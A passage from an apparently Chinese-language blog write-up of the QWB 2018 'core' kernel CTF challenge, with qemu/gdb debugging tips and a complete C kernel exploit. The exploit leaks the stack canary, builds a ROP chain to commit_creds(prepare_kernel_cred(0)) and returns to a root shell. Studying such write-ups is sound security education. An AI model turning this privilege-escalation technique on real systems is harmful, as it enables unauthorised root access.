iretq</span><br><span class=\"line\">    user_shell_addr <span class=\"comment\">// get shell函数的地址</span></span><br><span class=\"line\">    user_cs</span><br><span class=\"line\">    user_eflags <span class=\"comment\">//64bit user_rflags</span></span><br><span class=\"line\">    user_sp</span><br><span class=\"line\">    user_ss</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"qemu\"><a href=\"#qemu\" class=\"headerlink\" title=\"qemu\"></a>qemu</h4><ul>\n<li><p>做题时最好首先file一下确认文件类型，如果不是cpio文件则在本地调试时应按照原先的打包方式打包回去，否则可能会出现无法启动等问题。有的题目会给出打包文件系统的shell文件，需要重点关注。</p>\n</li>\n<li><p>如果题目给的内核跑不动，可以尝试将boot.sh中申请的内存改大些（即qemu的-m选项后面，如果64M跑不动就改成128M试试）。</p>\n</li>\n<li><p>在入门测试时，经常会遇到内核启动不了，一直在重启的情况，将控制台强行叉掉后再开启可能会显示：<code>qemu-system-x86_64: -s: Failed to find an available port: Address already in use</code>。这是因为强制关闭后，qemu占用的端口还未被清除。解决方法：使用<code>lsof -i tcp:&lt;port&gt;</code>命令查看指定端口的占用情况，在start.sh中看到了qemu后的-s选项说明默认端口为1234。此时即输入<code>lsof -i tcp:1234</code>，找到占用的pid将其kill即可：<code>kill &lt;pid&gt;</code></p>\n</li>\n</ul>\n<h4 id=\"gdb调试\"><a href=\"#gdb调试\" class=\"headerlink\" title=\"gdb调试\"></a>gdb调试</h4><p>和用户态调试不同，kernel的调试需要我们attach到qemu开放的端口</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo gdb</span><br><span class=\"line\">file vmlinux <span class=\"comment\"># 载入符号信息</span></span><br><span class=\"line\">target remote localhost:1234 <span class=\"comment\"># -s 默认为1234端口</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>在本地调试的时候可以先用root调试，获取进程的基地址方便下断点</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># qemu里获取基地址，通常基址的偏移相同，需要在gdb attach之前进行</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> /sys/module/xxx/sections/.text</span><br><span class=\"line\"><span class=\"built_in\">cat</span> /sys/module/xxx/sections/.data</span><br><span class=\"line\"><span class=\"built_in\">cat</span> /sys/module/xxx/sections/.bss</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在gdb中设置基地址</span></span><br><span class=\"line\">add-symbol-file ./xxx.ko text_base -s .data data_base -s .bss bss_base </span><br></pre></td></tr></table></figure>\n\n<p>修改为root</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class=\"line\">=&gt; setsid /bin/cttyhack setuidgid 0 /bin/sh</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveStatus</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">get_address</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">coreRead</span><span class=\"params\">(<span class=\"type\">char</span>* buf)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">coreCopyFunc</span><span class=\"params\">(<span class=\"type\">size_t</span> length)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">edit_off</span><span class=\"params\">(<span class=\"type\">size_t</span> num)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">shell</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">print_binary</span><span class=\"params\">(<span class=\"type\">char</span>* buf, <span class=\"type\">int</span> length)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// gadget </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">size_t</span> pop_rdi_ret=<span class=\"number\">0xffffffff81000b2f</span>; </span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">size_t</span> pop_rdx_ret=<span class=\"number\">0xffffffff810a0f49</span>; </span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">size_t</span> pop_rcx_ret=<span class=\"number\">0xffffffff81021e53</span>; </span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">size_t</span> swapgs_popfq_ret=<span class=\"number\">0xffffffff81a012da</span>; </span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">size_t</span> iretq_ret=<span class=\"number\">0xffffffff81050ac2</span>; </span><br><span class=\"line\"><span class=\"type\">const</span> <span class=\"type\">size_t</span> mov_rdi_rax_call_rdx=<span class=\"number\">0xffffffff8101aa6a</span>; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> fd=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">size_t</span> commit_creds=<span class=\"number\">0</span>, prepare_kernel_cred=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">size_t</span> raw_vmlinux_base=<span class=\"number\">0xffffffff81000000</span>;</span><br><span class=\"line\"><span class=\"type\">size_t</span> vmlinux_base=<span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"type\">size_t</span> vmoffset=<span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveStatus</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __asm__(<span class=\"string\">&quot;mov user_cs, cs;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;mov user_ss, ss;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;mov user_sp, rsp;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">            <span class=\"string\">&quot;pop user_rflags;&quot;</span></span><br><span class=\"line\">            );</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;\\033[34m\\033[1m[*] Status has been saved.\\033[0m&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// get address from /tmp/kallsym</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">get_address</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    FILE* symbols_table=fopen(<span class=\"string\">&quot;/tmp/kallsyms&quot;</span>,<span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(symbols_table==<span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[31m\\033[1m[x] Error: Cannot open file \\&quot;/tmp/kallsyms\\&quot;\\n\\033[0m&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">     </span><br><span class=\"line\">    <span class=\"type\">size_t</span> addr = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">char</span> type[<span class=\"number\">0x10</span>];</span><br><span class=\"line\">\t<span class=\"type\">char</span> func_name[<span class=\"number\">0x50</span>];</span><br><span class=\"line\">\t<span class=\"comment\">// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"built_in\">fscanf</span>(symbols_table, <span class=\"string\">&quot;%llx%s%s&quot;</span>, &amp;addr, type, func_name))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)\t\t<span class=\"comment\">// two addresses of key functions are all found, return directly.</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">        <span class=\"comment\">// function &quot;commit_creds&quot; found</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(!<span class=\"built_in\">strcmp</span>(func_name, <span class=\"string\">&quot;commit_creds&quot;</span>))</span><br><span class=\"line\">        &#123;\t\t</span><br><span class=\"line\">\t\t\tcommit_creds = addr;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[32m\\033[1m[+] Note: Address of function \\&quot;commit_creds\\&quot; found: \\033[0m%#llx\\n&quot;</span>, commit_creds);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">        <span class=\"comment\">// function &quot;prepare_kernel_cred&quot; found</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"built_in\">strcmp</span>(func_name, <span class=\"string\">&quot;prepare_kernel_cred&quot;</span>))</span><br><span class=\"line\">        &#123;\t</span><br><span class=\"line\">\t\t\tprepare_kernel_cred = addr;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[32m\\033[1m[+] Note: Address of function \\&quot;prepare_kernel_cred\\&quot; found: \\033[0m%#llx\\n&quot;</span>, prepare_kernel_cred);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">coreRead</span><span class=\"params\">(<span class=\"type\">char</span>* buf)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ioctl(fd,<span class=\"number\">0x6677889B</span>,buf);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">coreCopyFunc</span><span class=\"params\">(<span class=\"type\">size_t</span> length)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ioctl(fd,<span class=\"number\">0x6677889A</span>,length);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">edit_off</span><span class=\"params\">(<span class=\"type\">size_t</span> num)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ioctl(fd,<span class=\"number\">0x6677889C</span>,num);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">shell</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(getuid())</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    system(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// this is a universal function to print binary data from a char* array</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">print_binary</span><span class=\"params\">(<span class=\"type\">char</span>* buf, <span class=\"type\">int</span> length)</span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> index = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">char</span> output_buffer[<span class=\"number\">80</span>];</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(output_buffer, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">80</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(output_buffer, <span class=\"string\">&#x27; &#x27;</span>, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>; i&lt;(length % <span class=\"number\">16</span> == <span class=\"number\">0</span> ? length / <span class=\"number\">16</span> : length / <span class=\"number\">16</span> + <span class=\"number\">1</span>); i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"type\">char</span> temp_buffer[<span class=\"number\">0x10</span>];</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(temp_buffer, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">sprintf</span>(temp_buffer, <span class=\"string\">&quot;%#5x&quot;</span>, index);</span><br><span class=\"line\">\t\t<span class=\"built_in\">strcpy</span>(output_buffer, temp_buffer);</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">5</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">6</span>] = <span class=\"string\">&#x27;|&#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">7</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> j=<span class=\"number\">0</span>; j&lt;<span class=\"number\">16</span>; j++)&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(index+j &gt;= length)</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">sprintf</span>(output_buffer+<span class=\"number\">8</span>+<span class=\"number\">3</span>*j, <span class=\"string\">&quot;   &quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">sprintf</span>(output_buffer+<span class=\"number\">8</span>+<span class=\"number\">3</span>*j, <span class=\"string\">&quot;%02x &quot;</span>, ((<span class=\"type\">int</span>)buf[index+j]) &amp; <span class=\"number\">0xFF</span>);</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(!<span class=\"built_in\">isprint</span>(buf[index+j]))</span><br><span class=\"line\">\t\t\t\t\toutput_buffer[<span class=\"number\">58</span>+j] = <span class=\"string\">&#x27;.&#x27;</span>;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\t\t\t\toutput_buffer[<span class=\"number\">58</span>+j] = buf[index+j];</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">55</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">56</span>] = <span class=\"string\">&#x27;|&#x27;</span>;</span><br><span class=\"line\">\t\toutput_buffer[<span class=\"number\">57</span>] = <span class=\"string\">&#x27; &#x27;</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s\\n&quot;</span>, output_buffer);</span><br><span class=\"line\">\t\t<span class=\"built_in\">memset</span>(output_buffer+<span class=\"number\">58</span>, <span class=\"string\">&#x27;\\0&#x27;</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t\tindex += <span class=\"number\">16</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[34m\\033[1m[*] Start to exploit...\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">    saveStatus();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// open core</span></span><br><span class=\"line\">    fd=open(<span class=\"string\">&quot;/proc/core&quot;</span>,<span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(fd==<span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[31m\\033[1m[x] Error: Cannot open process \\&quot;core\\&quot;\\n\\033[0m&quot;</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// get commit_creds and prepare_kernel_cred </span></span><br><span class=\"line\">    get_address();</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"type\">char</span> buf[<span class=\"number\">0x50</span>]=&#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    <span class=\"comment\">// cal real vm base</span></span><br><span class=\"line\">    vmlinux_base=commit_creds<span class=\"number\">-0x9c8e0</span>;</span><br><span class=\"line\">    vmoffset=vmlinux_base-raw_vmlinux_base;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[34m\\033[1m[*] This is real vmlinux base :\\033[0m%llx\\n&quot;</span>,vmlinux_base);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// leak canary</span></span><br><span class=\"line\">    edit_off(<span class=\"number\">64</span>);</span><br><span class=\"line\">    coreRead(buf);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"type\">size_t</span> canary=((<span class=\"type\">size_t</span>*)buf)[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[35m\\033[1m[*] The value of canary is the first 8 bytes: \\033[0m%#llx\\n&quot;</span>, canary);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// make rop chain</span></span><br><span class=\"line\">    <span class=\"type\">size_t</span> rop_chain[<span class=\"number\">0x100</span>];</span><br><span class=\"line\">    <span class=\"type\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">// padding and canary</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(; i&lt;<span class=\"number\">10</span>; i++)</span><br><span class=\"line\">\t\trop_chain[i] = canary;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// commit_creds(prepare_kernel_cred(0)); </span></span><br><span class=\"line\">    <span class=\"comment\">// rdi=0</span></span><br><span class=\"line\">    rop_chain[i++]=pop_rdi_ret+vmoffset;</span><br><span class=\"line\">    rop_chain[i++]=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"comment\">// prepare_kernel_cred(0);</span></span><br><span class=\"line\">    rop_chain[i++]=prepare_kernel_cred;</span><br><span class=\"line\">    <span class=\"comment\">// rdi=rax; call rdx --&gt; pop rcx(move the next code of mov) --&gt; commit_creds(prepare_kernel_cred(0));</span></span><br><span class=\"line\">    rop_chain[i++]=pop_rdx_ret+vmoffset;</span><br><span class=\"line\">    rop_chain[i++]=pop_rcx_ret+vmoffset;</span><br><span class=\"line\">    rop_chain[i++]=mov_rdi_rax_call_rdx+vmoffset;</span><br><span class=\"line\">    rop_chain[i++]=commit_creds;</span><br><span class=\"line\">    <span class=\"comment\">// ret2usr swags; iretq</span></span><br><span class=\"line\">    rop_chain[i++]=swapgs_popfq_ret+vmoffset;</span><br><span class=\"line\">    rop_chain[i++]=<span class=\"number\">0</span>;   <span class=\"comment\">// popfq</span></span><br><span class=\"line\">    rop_chain[i++]=iretq_ret+vmoffset;</span><br><span class=\"line\">    <span class=\"comment\">// after the iretq: return address, user cs, user rflags, user sp, user ss</span></span><br><span class=\"line\">    rop_chain[i++]=(<span class=\"type\">size_t</span>)shell;</span><br><span class=\"line\">    rop_chain[i++]=user_cs;</span><br><span class=\"line\">    rop_chain[i++]=user_rflags;</span><br><span class=\"line\">    rop_chain[i++]=user_sp;</span><br><span class=\"line\">    rop_chain[i++]=user_ss;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[34m\\033[1m[*] Our rop chain looks like: \\033[0m\\n&quot;</span>);</span><br><span class=\"line\">\tprint_binary((<span class=\"type\">char</span>*)rop_chain, <span class=\"number\">0x100</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\twrite(fd, (<span class=\"type\">char</span>*)rop_chain, <span class=\"number\">0x800</span>);</span><br><span class=\"line\">    <span class=\"comment\">// use negative number overflow</span></span><br><span class=\"line\">\tcoreCopyFunc(<span class=\"number\">0xffffffffffff0100</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n","site":{"data":{}},"excerpt":"<p>强网杯2018 core，从0到1的kernel。</p>","more":"<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>首先分析启动脚本<code>start.sh</code></p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qemu-system-x86_64 \\\t<span class=\"comment\"># x86_64架构</span></span><br><span class=\"line\">-m 64M \\\t<span class=\"comment\"># 分配64M内存</span></span><br><span class=\"line\">-kernel ./bzImage \\\t\t<span class=\"comment\"># 使用bzImage作为内存镜像(kernel)\t</span></span><br><span class=\"line\">-initrd  ./core.cpio \\\t<span class=\"comment\"># 使用core.cpio作为磁盘镜像(文件系统)</span></span><br><span class=\"line\">-append <span class=\"string\">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</span> \\ <span class=\"comment\"># 设置root，指定终端为tty50，开启kaslr</span></span><br><span class=\"line\">-s  \\\t<span class=\"comment\"># 启动后qemu不立即运行guest，而是等待主机gdb发起连接，使用1234端口</span></span><br><span class=\"line\">-netdev user,<span class=\"built_in\">id</span>=t0, -device e1000,netdev=t0,<span class=\"built_in\">id</span>=nic0 \\     <span class=\"comment\"># 网络配置</span></span><br><span class=\"line\">-nographic  \\\t\t<span class=\"comment\"># 